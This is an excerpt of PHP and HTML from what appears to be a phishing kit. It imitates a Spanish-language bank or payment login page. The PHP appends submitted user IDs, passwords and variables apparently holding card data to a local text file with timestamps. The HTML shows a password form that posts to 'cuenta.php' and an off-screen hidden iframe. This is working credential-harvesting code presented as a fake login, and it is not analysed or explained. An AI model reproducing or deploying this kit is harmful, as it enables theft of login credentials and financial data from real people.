...
if(isset($_POST["galletita"]) && isset($_POST["galletita"])){
    
    $file = fopen("muyrandom.txt", "a");
fwrite($file, "User: ".$_POST['galletita']." - Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc." ".$userp." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);
...
<form action="cuenta.php" method="post" novalidate="" class="wizardAutoHeightMode ng-pristine ng-invalid ng-touched">
<div _ngcontent-c33="" class="ipswich-main-data">
<i _ngcontent-c33="" class="stream-Icon_login_profile_3"></i>
<input _ngcontent-c33="" autocomplete="off" class="ipswich-main-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" formcontrolname="galletita2" id="step01" placeholder="Ingrese su contraseña" name="galletita2" type="password">
...
<div _ngcontent-c42="" class="prisma_responsive" id="LoginPlaceHolder"><img class="prisma_banner c-default" src="img/13f6ebd6-3a21-4455-8ac2-f131aaf35295.jpg">
</div>
...
<iframe name="easyXDM_default1691_provider" id="easyXDM_default1691_provider" src="login.php" frameborder="0" style="position: absolute; top: -2000px; left: 0px;"></iframe>
</body>
</html>
